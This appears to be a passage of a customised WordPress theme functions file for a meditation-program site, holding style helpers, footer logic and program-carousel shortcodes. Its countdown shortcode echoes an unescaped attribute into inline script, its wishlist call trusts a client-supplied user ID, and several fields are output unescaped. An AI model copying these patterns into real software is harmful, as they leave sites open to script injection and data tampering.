if ( ! function_exists('bridge_qode_is_gutenberg_installed') ) {
	/**
	 * Function that checks if Gutenberg plugin installed
	 * @return bool
	 */
	function bridge_qode_is_gutenberg_installed() {
		return function_exists( 'is_gutenberg_page' ) && is_gutenberg_page();
	}
}
if ( ! function_exists('bridge_qode_is_wp_gutenberg_installed') ) {
	/**
	 * Function that checks if WordPress 5.x with Gutenberg editor installed
	 *
	 * @return bool
	 */
	function bridge_qode_is_wp_gutenberg_installed() {
		return class_exists( 'WP_Block_Type' );
	}
}

if(!function_exists('bridge_qode_get_side_menu_icon_html')) {
    /**
     * Function that outputs html for side area icon opener.
     * Uses $qodeIconCollections global variable
     * @return string generated html
     */
    function bridge_qode_get_side_menu_icon_html() {
        global $qodeIconCollections, $bridge_qode_options;

        $icon_html = '';

        $icon_pack = bridge_qode_option_get_value('side_area_button_icon_pack');

        if(isset($icon_pack) && $icon_pack !== '' && $icon_pack!== 'svg_path') {
            $icon_collection_obj = $qodeIconCollections->getIconCollection($icon_pack);
            if( $icon_collection_obj ){
                $icon_field_name = 'side_area_icon_'. $icon_collection_obj->param;

                $side_area_icon = bridge_qode_option_get_value($icon_field_name);

                if(isset($side_area_icon) && $side_area_icon !== ''){

                    if (method_exists($icon_collection_obj, 'render')) {
                        $icon_html = $icon_collection_obj->render($side_area_icon);
                    }
                }
            }
        } else if( $icon_pack == 'svg_path' ){
            $svg_opener_path = bridge_qode_options()->getOptionValue('side_area_icon_svg_opener');

            if( ! empty( $svg_opener_path ) ){
                $icon_html = $svg_opener_path;
            }
        }

        return $icon_html;
    }
}

if(!function_exists('bridge_qode_get_mobile_menu_icon_html')) {
    /**
     * Function that outputs html for side area icon opener.
     * Uses $qodeIconCollections global variable
     * @return string generated html
     */
    function bridge_qode_get_mobile_menu_icon_html() {
        global $qodeIconCollections, $bridge_qode_options;

        $icon_html = '';

        $icon_pack = bridge_qode_option_get_value('mobile_menu_button_icon_pack');

        if(isset($icon_pack) && $icon_pack !== '') {
            $icon_collection_obj = $qodeIconCollections->getIconCollection($icon_pack);
            if( $icon_collection_obj ) {
                $icon_field_name = 'mobile_menu_icon_' . $icon_collection_obj->param;

                $mobile_menu_icon = bridge_qode_option_get_value($icon_field_name);

                if (isset($mobile_menu_icon) && $mobile_menu_icon !== '') {

                    if (method_exists($icon_collection_obj, 'render')) {
                        $icon_html = $icon_collection_obj->render($mobile_menu_icon);
                    }
                }
            }
        }

        return $icon_html;
    }
}

if ( ! function_exists('bridge_qode_page_custom_style') ) {
	/**
	 * Function that print custom page style
	 */
	function bridge_qode_page_custom_style() {
		$style = apply_filters( 'bridge_qode_filter_add_page_custom_style', $style = array() );
		if ( $style !== '' ) {
			if(!bridge_qode_is_ajax_enabled()) {
				wp_add_inline_style('bridge-stylesheet', implode(' ', $style));
			} else {
                echo '<style type="text/css" id="stylesheet-inline-css-' .bridge_qode_get_page_id() . '">';
                print implode(' ', $style);
                echo '</style>';
			}
		}
	}

}

if( ! function_exists('bridge_qode_add_page_custom_style') ){
    function bridge_qode_add_page_custom_style(){
        if(!bridge_qode_is_ajax_enabled()) {
            add_action( 'wp_enqueue_scripts', 'bridge_qode_page_custom_style' );
        } else {
            add_action( 'bridge_qode_action_visual_composer_custom_shortcodce_css', 'bridge_qode_page_custom_style' );
        }
    }

    add_action('after_setup_theme', 'bridge_qode_add_page_custom_style');
}

if ( ! function_exists('bridge_qode_container_style') ) {
	/**
	 * Function that return container style
	 */
	function bridge_qode_container_style($style ) {
		$page_id      = bridge_qode_get_page_id();
		$class_prefix = bridge_qode_get_unique_page_class( $page_id, true );
		
		$container_selector = array(
			$class_prefix . '.transparent_content',
			$class_prefix . '.transparent_content.overlapping_content .content .content_inner > .container',
			$class_prefix . '.transparent_content.overlapping_content .content .content_inner > .full_width'
		);
		
		$container_class       = array();
		$page_background_image_url = get_post_meta( $page_id, 'qode_page_background_image', true );
		$page_background_color = get_post_meta( $page_id, 'qode_body_page_background_image', true );
		$page_background_pattern_image_url = get_post_meta( $page_id, 'qode_page_background_pattern_image', true );
		$page_background_image_fixed = get_post_meta( $page_id, 'qode_page_background_image_fixed', true );

			

		if ( !empty($page_background_image_url) ) {
			$container_class['background-image'] = "url(" . $page_background_image_url . ")";
			$container_class['background-size'] = "cover";			
			$container_class['background-position'] = 'center 0px';
			$container_class['background-repeat'] = 'no-repeat';

			if( !empty($page_background_image_fixed) && $page_background_image_fixed == 'no' ){
				$container_class['background-attachment'] = 'initial';
			}

			else {
				$container_class['background-attachment'] = 'fixed';
			}

		}

		else if( !empty($page_background_pattern_image_url) ){
			$container_class['background-image'] = "url(" . $page_background_pattern_image_url . ")";
			$container_class['background-position'] = '0 0';
			$container_class['background-repeat'] = 'repeat';
		}
		
		$current_style = bridge_qode_dynamic_css( $container_selector, $container_class );
		
		$style[] = $current_style;
		
		return $style;
	}
	
	add_filter( 'bridge_qode_filter_add_page_custom_style', 'bridge_qode_container_style' );
}

if ( ! function_exists('bridge_qode_container_background_color_style') ) {
	/**
	 * Function that return container style
	 */
	function bridge_qode_container_background_color_style($style ) {
		$page_id      = bridge_qode_get_page_id();
		$class_prefix = bridge_qode_get_unique_page_class( $page_id, true );

		$container_selector = array(
			$class_prefix . ' .content > .content_inner > .container',
			$class_prefix . ' .content > .content_inner > .full_width'
		);

		$container_class       = array();
		$page_background_color = get_post_meta( $page_id, 'qode_page_background_color', true );


		if ( !empty($page_background_color) ) {
			$container_class['background-color'] = $page_background_color;
		}

		$current_style = bridge_qode_dynamic_css( $container_selector, $container_class );

		$style[] = $current_style;

		return $style;
	}

	add_filter( 'bridge_qode_filter_add_page_custom_style', 'bridge_qode_container_background_color_style' );
}

if ( ! function_exists('bridge_qode_container_inner_style') ) {
	/**
	 * Function that return container style
	 */
	function bridge_qode_container_inner_style($style ) {
		$page_id      = bridge_qode_get_page_id();
		$class_prefix = bridge_qode_get_unique_page_class( $page_id, true );

		$container_selector = array(
			$class_prefix . ' .content > .content_inner > .container > .container_inner',
			$class_prefix . ' .content > .content_inner > .full_width > .full_width_inner'
		);
		$page_margin = get_post_meta( $page_id, 'qode_margin_after_title', true );
		$page_mobile_margin = get_post_meta( $page_id, 'qode_margin_after_title_mobile', true );

		$container_inner_class       = array();

		if ( !empty($page_margin) ) {
			if ( !empty($page_mobile_margin) && $page_mobile_margin == 'yes' ) {
				$container_inner_class['padding-top'] = $page_margin . "px !important";
			} else {
				$container_inner_class['padding-top'] = $page_margin . "px";
			}
		}

		$current_style = bridge_qode_dynamic_css( $container_selector, $container_inner_class );

		$style[] = $current_style;

		return $style;
	}

	add_filter( 'bridge_qode_filter_add_page_custom_style', 'bridge_qode_container_inner_style' );
}

if ( ! function_exists('bridge_qode_page_transparent_content') ) {

	function bridge_qode_page_transparent_content($classes ) {
		$page_id      = bridge_qode_get_page_id();
		$page_transparent_content = get_post_meta( $page_id, 'qode_transparent_content_page', true );
		$class_value = 'transparent_content';


		if( !empty($page_transparent_content) && $page_transparent_content == 'yes'){
			$classes[] = $class_value;
		}

		else if($page_transparent_content == 'no'){
			if (($key = array_search($class_value, $classes)) !== false) {
			    unset($classes[$key]);
			}
		}
		
		return $classes;
	}
	
	add_filter('body_class','bridge_qode_page_transparent_content');
}

if ( ! function_exists('bridge_qode_footer_style') ) {
    /**
     * Function that return container style
     */
    function bridge_qode_footer_style($style ) {
        $page_id      = bridge_qode_get_page_id();
        $class_prefix = bridge_qode_get_unique_page_class( $page_id, true );
        
        $container_selector = array(
            $class_prefix . '.disabled_footer_top .footer_top_holder',
            $class_prefix . '.disabled_footer_bottom .footer_bottom_holder'
        );
        
        $container_class       = array();

        $container_class['display'] = "none";
        
        $current_style = bridge_qode_dynamic_css( $container_selector, $container_class );
        
        $style[] = $current_style;
        
        return $style;
    }
    
    add_filter( 'bridge_qode_filter_add_page_custom_style', 'bridge_qode_footer_style' );
}

if ( ! function_exists('bridge_qode_footer_top_disabled_class') ) {

    function bridge_qode_footer_top_disabled_class($classes ) {

        $page_id = bridge_qode_get_page_id();
        $footer_top_global = bridge_qode_options()->getOptionValue('show_footer_top');
        $footer_top_per_page_option = get_post_meta($page_id, "footer_top_per_page", true);
        $footer_option = true;

        if(isset($footer_top_per_page_option) && $footer_top_per_page_option == 'no'){
            $footer_option = false;
        } else if(isset($footer_top_per_page_option) && $footer_top_per_page_option == ''){
            if(isset($footer_top_global) && $footer_top_global == 'no'){
                $footer_option = false;
            } 
        }

        $footer_widgets_present = false;

        //check footer columns.If they are empty, disable footer top
        for ( $i = 1; $i <= 4; $i ++ ) {
            $footer_columns_id = 'footer_column_' . $i;
            if ( is_active_sidebar( $footer_columns_id ) ) {
                $footer_widgets_present = true;
                break;
            }
        }

        $footer_option = $footer_option && $footer_widgets_present;

        if($footer_option == false){
            $classes[] = 'disabled_footer_top';
        }

        return $classes;
    
    }
    
    add_filter('body_class','bridge_qode_footer_top_disabled_class');
}

if ( ! function_exists('bridge_qode_footer_bottom_disabled_class') ) {

    function bridge_qode_footer_bottom_disabled_class($classes ) {

        $page_id = bridge_qode_get_page_id();
        $footer_bottom_global = bridge_qode_options()->getOptionValue('footer_text');
        $footer_bottom_per_page_option = get_post_meta($page_id, "footer_bottom_per_page", true);
        $footer_option = true;

        if(isset($footer_bottom_per_page_option) && $footer_bottom_per_page_option == 'no'){
            $footer_option = false;
        }
        else if(isset($footer_bottom_per_page_option) && $footer_bottom_per_page_option == ''){
            if(isset($footer_bottom_global) && $footer_bottom_global == 'no'){
                $footer_option = false;
            } 
        }

        $footer_widgets_present = false;

        //check footer bottom columns. If they are empty, disable footer bottom
        $footer_bottom_names = array('_left', '', '_right');
        foreach ( $footer_bottom_names as $name ) {
            $footer_columns_id = 'footer_text' . $name;
            if ( is_active_sidebar( $footer_columns_id ) ) {
                $footer_widgets_present = true;
                break;
            }
        }

        $footer_option = $footer_option && $footer_widgets_present;

        if($footer_option == false){
            $classes[] = 'disabled_footer_bottom';
        }

        return $classes;
    
    }
    
    add_filter('body_class','bridge_qode_footer_bottom_disabled_class');
}

if ( ! function_exists('bridge_qode_advanced_footer_responsive') ) {

	function bridge_qode_advanced_footer_responsive($classes ) {

		$advanced_footer_top_responsive = bridge_qode_options()->getOptionValue('advanced_footer_top_responsive');
		
		if (! empty($advanced_footer_top_responsive) && $advanced_footer_top_responsive == 'yes' ) {

			$advanced_footer_top_responsive_width = bridge_qode_options()->getOptionValue('footer_top_responsive_advanced_width');
			$classes[] = 'qode_advanced_footer_responsive' . '_' . $advanced_footer_top_responsive_width;
		}

		return $classes;
	
	}
	
	add_filter('body_class','bridge_qode_advanced_footer_responsive');
}

if( ! function_exists('bridge_qode_header_in_grid_body_class') ){

    function bridge_qode_header_in_grid_body_class($classes ){

        $header_in_grid = bridge_qode_options()->getOptionValue('header_in_grid');

        if( ! empty($header_in_grid) && $header_in_grid == 'yes' ){

            $classes[] = 'qode_header_in_grid';

        }

        return $classes;

    }

    add_filter('body_class','bridge_qode_header_in_grid_body_class');

}

if(!function_exists('bridge_qode_add_grid_lines')) {
	
	function bridge_qode_add_grid_lines() {
		$id = bridge_qode_get_page_id();
		$number_of_lines_page = get_post_meta( $id, 'qode_content_grid_lines_meta', true );
		$lines_skin_page = get_post_meta( $id, 'qode_content_grid_lines_skin_meta', true );
		$number_of_lines_global = bridge_qode_options()->getOptionValue('content_grid_lines');
		$lines_skin_global = bridge_qode_options()->getOptionValue('content_grid_lines_skin');

		$number_of_lines = 'none';

		if( $number_of_lines_page != '' && $number_of_lines_page != 'none' ){
			$number_of_lines = $number_of_lines_page;
			$lines_skin = $lines_skin_page;
		}

		else if( $number_of_lines_page == '' ){
			$number_of_lines = $number_of_lines_global;
			$lines_skin = $lines_skin_global;
		}


		$html = '';
		if($number_of_lines !== 'none'){
			$html .= '<div class="qode-grid-lines-holder qode-grid-columns-' . esc_html($number_of_lines) . ' qode-grid-lines-' . esc_html($lines_skin) . '-skin">';
			for ($i = 1; $i <= $number_of_lines; $i++) {
				$html .= '<div class="qode-grid-line qode-grid-column-' . $i . '"></div>';
			}
			$html .= '</div>';
		}

		print bridge_qode_get_module_part( $html );
	}

	add_filter('bridge_qode_action_after_container_inner_open', 'bridge_qode_add_grid_lines');
}

if(!function_exists('bridge_qode_admin_google_fonts_styles')) {
    /**
     * Function that includes google fonts defined anywhere in the theme
     */
    function bridge_qode_admin_google_fonts_styles() {
        global $bridge_qode_options, $bridge_qode_framework;

        if(bridge_qode_options()->getOptionValue('disable_google_fonts') != 'yes') {
            $font_weight_str = '100,200,300,400,500,600,700,800,900,300italic,400italic,700italic';
            $default_font_string = 'Raleway:' . $font_weight_str;

            $font_sipmle_field_array = array();
            if (is_array($bridge_qode_framework->qodeOptions->getOptionsByType('fontsimple')) && count($bridge_qode_framework->qodeOptions->getOptionsByType('fontsimple'))) {
                $font_sipmle_field_array = $bridge_qode_framework->qodeOptions->getOptionsByType('fontsimple');
            }

            $font_field_array = array();
            if (is_array($bridge_qode_framework->qodeOptions->getOptionsByType('font')) && count($bridge_qode_framework->qodeOptions->getOptionsByType('font'))) {
                $font_field_array = $bridge_qode_framework->qodeOptions->getOptionsByType('font');
            }

            $available_font_options = array_merge($font_sipmle_field_array, $font_field_array);

            //define available font options array
            $fonts_array = array();
            foreach ($available_font_options as $font_option) {
                //is font set and not set to default and not empty?
                if (isset($bridge_qode_options[$font_option]) && $bridge_qode_options[$font_option] !== '-1' && $bridge_qode_options[$font_option] !== '' && !bridge_qode_is_native_font($bridge_qode_options[$font_option]) && !bridge_qode_is_custom_font($bridge_qode_options[$font_option])) {
                    $font_option_string = $bridge_qode_options[$font_option] . ':' . $font_weight_str;
                    if (!in_array($font_option_string, $fonts_array)) {
                        $fonts_array[] = $font_option_string;
                    }

                }
            }

            $font_subset_str = 'latin,latin-ext';

            $fonts_array         = array_diff( $fonts_array, array( '-1:' . $font_weight_str ) );
            $google_fonts_string = implode( '|', $fonts_array );

            $protocol = is_ssl() ? 'https:' : 'http:';

            //is google font option checked anywhere in theme?
            if ( count( $fonts_array ) > 0 ) {

                //include all checked fonts
                $fonts_full_list      = $default_font_string . '|' . str_replace( '+', ' ', $google_fonts_string );
                $fonts_full_list_args = array(
                    'family' => urlencode( $fonts_full_list ),
                    'subset' => urlencode( $font_subset_str ),
                );

                $bridge_php_global_fonts = add_query_arg( $fonts_full_list_args, $protocol . '//fonts.googleapis.com/css' );
                wp_enqueue_style( 'bridge-style-handle-google-fonts', esc_url_raw( $bridge_php_global_fonts ), array(), '1.0.0' );

            } else {
                //include default google font that theme is using
                $default_fonts_args          = array(
                    'family' => urlencode( $default_font_string ),
                    'subset' => urlencode( $font_subset_str ),
                );
                $bridge_php_global_fonts = add_query_arg( $default_fonts_args, $protocol . '//fonts.googleapis.com/css' );
                wp_enqueue_style( 'bridge-style-handle-google-fonts', esc_url_raw( $bridge_php_global_fonts ), array(), '1.0.0' );
            }
        }
    }

    add_action('wp_enqueue_scripts', 'bridge_qode_google_fonts_styles');
}

//Enqueue google fonts and custom styles for Gutenberg editor
if ( ! function_exists('bridge_qode_enqueue_editor_customizer_styles') ) {
    /**
     * Enqueue supplemental block editor styles
     */
    function bridge_qode_enqueue_editor_customizer_styles() {
        wp_enqueue_style( 'qode-style-modules-admin-styles', QODE_FRAMEWORK_ADMIN_ASSETS_ROOT . '/css/qode-modules-admin.css' );
        wp_enqueue_style( 'qode-style-handle-editor-customizer-styles', QODE_FRAMEWORK_ADMIN_ASSETS_ROOT . '/css/editor-customizer-style.css' );
    }

    // add google font
	add_action( 'enqueue_block_editor_assets', 'bridge_qode_admin_google_fonts_styles' );
    // add action
    add_action( 'enqueue_block_editor_assets', 'bridge_qode_enqueue_editor_customizer_styles' );
}

if(!function_exists('bridge_qode_remove_yoast_json_on_ajax')) {
    /**
     * Function that removes yoast json ld script
     * that stops page transition to work on home page
     * Hooks to wpseo_json_ld_output in order to disable json ld script
     * @return bool
     *
     * @param $data array json ld data that is being passed to filter
     *
     * @version 0.2
     */
    function bridge_qode_remove_yoast_json_on_ajax($data) {
        //is current request made through ajax?
        if ( bridge_qode_qode_core_installed() && bridge_core_is_ajax() ) {
            //disable json ld script
            return array();
        }

        return $data;
    }

    //is yoast installed and it's version is greater or equal of 1.6?
    if(defined('WPSEO_VERSION') && version_compare(WPSEO_VERSION, '1.6') >= 0) {
        add_filter( 'wpseo_json_ld_output', 'bridge_qode_remove_yoast_json_on_ajax' );
        add_filter( 'disable_wpseo_json_ld_search', 'bridge_qode_remove_yoast_json_on_ajax' );
    }
}

function bts_countdown( $atts ) {
	extract(shortcode_atts( array(
		'end' => '2020-09-19 13:00:00',
		
	), $atts ));

	ob_start();
	?> 
<div id="countdown">
	
</div>
<script>
    var countDownDate = new Date("<?php echo $end?>").getTime();
    /*var x = setInterval(function () {*/

        // Get today's date and time
        var now = new Date().getTime();

        // Find the distance between now and the count down date
        var distance = countDownDate - now;

        // Time calculations for days, hours, minutes and seconds
        var days = Math.floor(distance / (1000 * 60 * 60 * 24));
        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);

        // Output the result in an element with id="demo"

        if (distance < 0) {
            clearInterval(x);
           days=hours=minutes=seconds = "00"
        }

        var html = '<div id="countdown-5d2ef455db975" class="pp-countdown pp-countdown-fixed-timer is-countdown">\n' +
            '    <div class="pp-countdown-item default">\n' +
            '        <div class="pp-countdown-digit-wrapper default"><h3 class="pp-countdown-digit default">'+days+'</h3></div>\n' +
            '        <div class="pp-countdown-label-wrapper">\n' +
            '            <div class="pp-countdown-label default">Days</div>\n' +
            '        </div>\n' +
            '    </div>\n' +
            '    <div class="pp-countdown-item default">\n' +
            '        <div class="pp-countdown-digit-wrapper default"><h3 class="pp-countdown-digit default">'+hours+'</h3></div>\n' +
            '        <div class="pp-countdown-label-wrapper">\n' +
            '            <div class="pp-countdown-label default">Hours</div>\n' +
            '        </div>\n' +
            '    </div>\n' +
            '    <div class="pp-countdown-item default">\n' +
            '        <div class="pp-countdown-digit-wrapper default"><h3 class="pp-countdown-digit default">'+minutes+'</h3></div>\n' +
            '        <div class="pp-countdown-label-wrapper">\n' +
            '            <div class="pp-countdown-label default">Minutes</div>\n' +
            '        </div>\n' +
            '    </div>\n' +
            '    <div class="pp-countdown-item default">\n' +
            '        <div class="pp-countdown-digit-wrapper default"><h3 class="pp-countdown-digit default">'+seconds+'</h3></div>\n' +
            '        <div class="pp-countdown-label-wrapper">\n' +
            '            <div class="pp-countdown-label default">Seconds</div>\n' +
            '        </div>\n' +
            '    </div>\n' +
            '</div>'

        document.getElementById("countdown").innerHTML = html;

        
    /*}, 1000);*/
</script>
<?php
	return ob_get_clean();
}
add_shortcode( 'bts_countdown', 'bts_countdown' );

function custom_instagram_settings($code){
    if(strpos($code, 'instagr.am') !== false || strpos($code, 'instagram.com') !== false){ // if instagram embed
	    $return = preg_replace("@data-instgrm-captioned@", "", $code); // remove caption class
	    return $return;		
    }
return $code;
}

add_filter('embed_handler_html', 'custom_instagram_settings');
add_filter('embed_oembed_html', 'custom_instagram_settings');

function crunchify_embed_defaults($embed_size){
	$embed_size['width'] = 610;
	$embed_size['height'] = 400;
	return $embed_size;
}
add_filter('embed_defaults', 'crunchify_embed_defaults');

add_image_size( 'custom-image-size', 258, 150, true ); 
/** Shortcode for front page first slider **/
add_shortcode( 'new-programs', 'get_new_programs' );
function get_new_programs( $atts ) {
	extract( shortcode_atts( array(
		'category'			=> '',
		'max'				=> 10

	), $atts ) );
	$user = get_current_user_id();
	$return_str = '<div class="new-and-featured-programs new-feature-slide owl-carousel owl-theme">';
	$args = array (
		'suppress_filters' => 0,
		'post_type'=>'program-post',
		'order' => 'DESC',
		'posts_per_page' => $max
	);
	if ($category && !empty($category)){
		$args['tax_query'] = array(
			array(
				'taxonomy'  => 'program_category',
				'field'     => 'slug',
				'terms'     => $category,
			),
		);
	}
	$lastposts = get_posts( $args );
	if ( $lastposts ) {
		foreach ( $lastposts as $post ) {
			if(MeprRule::is_locked($post)) {
				$lock = '<i class="fa fa-lock" aria-hidden="true"></i> ';
			}
			else {
				$lock = '';
			}
			$fet_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID));
			$return_str .= '<div class="program-post item"><a onclick="wish('.$post->ID.','.$user .')">';
			$get_id = $post->ID."_".$user;
			
			$my_post_meta = get_post_meta($post->ID, $get_id, true);
			if ( ! empty ( $my_post_meta ) ) {
				// they exist
				$return_str .= '<i style="color:red" class="fa fa-heart"></i>';
			}else{
				$return_str .= '<i class="fa fa-heart"></i>';
			}
			$return_str .= '</a><a href="'.get_permalink($post->ID).'">';
			$return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$fet_image.'"></div>';
			$return_str .= '<div class="program-cont-dtl">';
			$return_str .= '<p class="program-exc">'.$lock.$post->post_excerpt.'</p>';
			$return_str .= '<div class="prgram-bottom">';
			if(get_field("day__meditations_number",$post->ID)!='' && get_field("day__meditations_title",$post->ID)!=''){
				$return_str .= '<span class="btm-span"><span class="span1">'.get_field("day__meditations_number",$post->ID).'</span><span class="span2">'.get_field("day__meditations_title",$post->ID).'</span></span>';
			}
			if(get_field("mins__day",$post->ID)!='' && get_field("mins__day_title",$post->ID)!=''){
				$return_str .= '<span class="btm-span"><span class="span1">'.get_field("mins__day",$post->ID).'</span><span class="span2">'.get_field("mins__day_title",$post->ID).'</span></span>';
			}
			$level_type = get_field("type",$post->ID);
			if($level_type!=''){
				if($level_type=="Beginner" || $level_type == "All Levels"){
					$imgpath = get_template_directory_uri()."/img/beginner.png";
				}
				else if($level_type=="Intermediate"){
					$imgpath = get_template_directory_uri()."/img/intermediate.png";
				}
				else if($level_type=="Advanced"){
					$imgpath = get_template_directory_uri()."/img/advanced.png";
				}
				$return_str .= '<span class="btm-span"><span class="span1"><img src="'.$imgpath.'"></span><span class="span2">'.get_field("type",$post->ID).'</span></span>';
			}
			$return_str .= '</div>';
			$return_str .= '</div>';
			$return_str .= '</div></a>';
		}
	}
	$return_str .= '</div>';
	$return_str .= '<script type="text/javascript">
	function wish(postid,userid){
		var data = {
			action: "mylist_postmeta_input",
			post_id: postid,
			user_id: userid
		};
		var ajaxurl = my_ajax_object.ajax_url;  //WHAT IS THIS?!?!
		jQuery.post(ajaxurl, data, function(response) {
			console.log(response);
		});
	}
	</script>';
	return $return_str;
}

add_shortcode( 'popular-programs', 'get_popular_programs' );
function get_popular_programs( $atts ) {
	$user= get_current_user_id();
    $return_str = '<div class="new-and-featured-programs new-feature-slide owl-carousel owl-theme">';
    $args = array ( 'post_type'=>'program-post','meta_key' => 'wpb_post_views_count', 'orderby' => 'meta_value_num', 'order' => 'DESC','posts_per_page' => 10 );
    $lastposts = get_posts( $args );
    if ( $lastposts ) {
        foreach ( $lastposts as $post ) {
            $fet_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID));
            $return_str .= '<div class="program-post item"><a onclick="wish('.$post->ID.','.$user .')"><i class="fa fa-heart"></i></a><a href="'.get_permalink($post->ID).'">';
            $return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$fet_image.'"></div>';
            $return_str .= '<div class="program-cont-dtl">';
            $return_str .= '<p class="program-exc">'.$post->post_excerpt.'</p>';
            $return_str .= '<div class="prgram-bottom">';
            if(get_field("day__meditations_number",$post->ID)!='' && get_field("day__meditations_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("day__meditations_number",$post->ID).'</span><span class="span2">'.get_field("day__meditations_title",$post->ID).'</span></span>';
            }
            if(get_field("mins__day",$post->ID)!='' && get_field("mins__day_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("mins__day",$post->ID).'</span><span class="span2">'.get_field("mins__day_title",$post->ID).'</span></span>';
            }
			$level_type = get_field("type",$post->ID);
            if($level_type!=''){
                if($level_type=="Beginner" || $level_type == "All Levels"){
                    $imgpath = get_template_directory_uri()."/img/beginner.png";
                }
                else if($level_type=="Intermediate"){
                    $imgpath = get_template_directory_uri()."/img/intermediate.png";
                }
                else if($level_type=="Advanced"){
                    $imgpath = get_template_directory_uri()."/img/advanced.png";
                }
                $return_str .= '<span class="btm-span"><span class="span1"><img src="'.$imgpath.'"></span><span class="span2">'.get_field("type",$post->ID).'</span></span>';
            }
             $return_str .= '</div>';
            $return_str .= '</div>';
            $return_str .= '</a></div>';
        }
    }
	$return_str .= '</div>';
	$return_str .= '<script type="text/javascript">
	function wish(postid,userid){
		var data = {
			action: "mylist_postmeta_input",
			post_id: postid,
			user_id: userid
		};
		var ajaxurl = my_ajax_object.ajax_url;  //WHAT IS THIS?!?!
		jQuery.post(ajaxurl, data, function(response) {
			console.log(response);
		});
	}
</script>';
    return $return_str;
}

/**Popular post code**/
add_action( 'wp', 'wpse69369_special_thingy' );
function wpse69369_special_thingy()
{
    if ('program-post' === get_post_type() AND is_singular()){
        wpb_set_post_views(get_the_ID());
    }
}
function wpb_set_post_views($postID) {
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


add_shortcode( 'category-programs', 'get_category_programs' );
function get_category_programs( $atts ) {
	$user= get_current_user_id();
    $args = array("hide_empty" => 0,
      "post_type"      => "program-post",      
      "taxonomy"      => "program_category",      
      "orderby"   => "name",
      "order"     => "ASC",
      "exclude" => "15" );
    $category = get_terms($args);
    $return_str = '';
    foreach($category as $catdata){
		if($catdata->count > 0){
			$return_str .= '<h2>'.$catdata->name.'</h2><div class="new-and-featured-programs new-feature-slide owl-carousel owl-theme">';
			$args = array (
				'tax_query'     => array(
					array(
						'taxonomy'  => 'program_category',
						'field'     => 'id',
						'terms'     => $catdata->term_id,
					),
				),
				'post_type'=>'program-post',
				'order' => 'DESC',
				'posts_per_page' => 10
			);
			$lastposts = get_posts( $args );
			if ( $lastposts ) {
				foreach ( $lastposts as $post ) {
					$fet_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID));
					$return_str .= '<div class="program-post item"><a onclick="wish('.$post->ID.','.$user .')"><i class="fa fa-heart"></i></a><a href="'.get_permalink($post->ID).'">';
					$return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$fet_image.'"></div>';
					$return_str .= '<div class="program-cont-dtl">';
					$return_str .= '<p class="program-exc">'.$post->post_excerpt.'</p>';
					$return_str .= '<div class="prgram-bottom">';
					if(get_field("day__meditations_number",$post->ID)!='' && get_field("day__meditations_title",$post->ID)!=''){
						$return_str .= '<span class="btm-span"><span class="span1">'.get_field("day__meditations_number",$post->ID).'</span><span class="span2">'.get_field("day__meditations_title",$post->ID).'</span></span>';
					}
					if(get_field("mins__day",$post->ID)!='' && get_field("mins__day_title",$post->ID)!=''){
						$return_str .= '<span class="btm-span"><span class="span1">'.get_field("mins__day",$post->ID).'</span><span class="span2">'.get_field("mins__day_title",$post->ID).'</span></span>';
					}
					$level_type = get_field("type",$post->ID);
					if($level_type!=''){
						if($level_type=="Beginner" || $level_type == "All Levels"){
							$imgpath = get_template_directory_uri()."/img/beginner.png";
						}
						else if($level_type=="Intermediate"){
							$imgpath = get_template_directory_uri()."/img/intermediate.png";
						}
						else if($level_type=="Advanced"){
							$imgpath = get_template_directory_uri()."/img/advanced.png";
						}
						$return_str .= '<span class="btm-span"><span class="span1"><img src="'.$imgpath.'"></span><span class="span2">'.get_field("type",$post->ID).'</span></span>';
					}
					$return_str .= '</div>';
					$return_str .= '</div>';
					$return_str .= '</a></div>';
				}
			}
			$return_str .= '</div>';
		}
	}
	$return_str .= '<script type="text/javascript">
	function wish(postid,userid){
		var data = {
			action: "mylist_postmeta_input",
			post_id: postid,
			user_id: userid
		};
		var ajaxurl = my_ajax_object.ajax_url;  //WHAT IS THIS?!?!
		jQuery.post(ajaxurl, data, function(response) {
			console.log(response);
		});
	}
</script>';
    return $return_str;
}

add_shortcode( 'previously-viewed-programs', 'previously_viewed_programs' );
function previously_viewed_programs( $atts ) {
	$user = get_current_user_id();
	$postID = "last_viewed_program";
	$user_id_with_post = $user."_".$postID;
    $return_str = '<div class="new-and-featured-programs new-feature-slide owl-carousel owl-theme">';
    $args = array ( 'post_type'=>'program-post','meta_key' => $user_id_with_post, 'orderby' => 'meta_value', 'order' => 'DESC','posts_per_page' => 10 );
    $lastposts = get_posts( $args );
    if ( $lastposts ) {
        foreach ( $lastposts as $post ) {
            $fet_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID));
            $return_str .= '<div class="program-post item"><a onclick="wish('.$post->ID.','.$user .')"><i class="fa fa-heart"></i></a><a href="'.get_permalink($post->ID).'">';
            $return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$fet_image.'"></div>';
            $return_str .= '<div class="program-cont-dtl">';
            $return_str .= '<p class="program-exc">'.$post->post_excerpt.'</p>';
            $return_str .= '<div class="prgram-bottom">';
            if(get_field("day__meditations_number",$post->ID)!='' && get_field("day__meditations_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("day__meditations_number",$post->ID).'</span><span class="span2">'.get_field("day__meditations_title",$post->ID).'</span></span>';
            }
            if(get_field("mins__day",$post->ID)!='' && get_field("mins__day_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("mins__day",$post->ID).'</span><span class="span2">'.get_field("mins__day_title",$post->ID).'</span></span>';
            }
            $level_type = get_field("type",$post->ID);
			if($level_type!=''){
				if($level_type=="Beginner" || $level_type == "All Levels"){
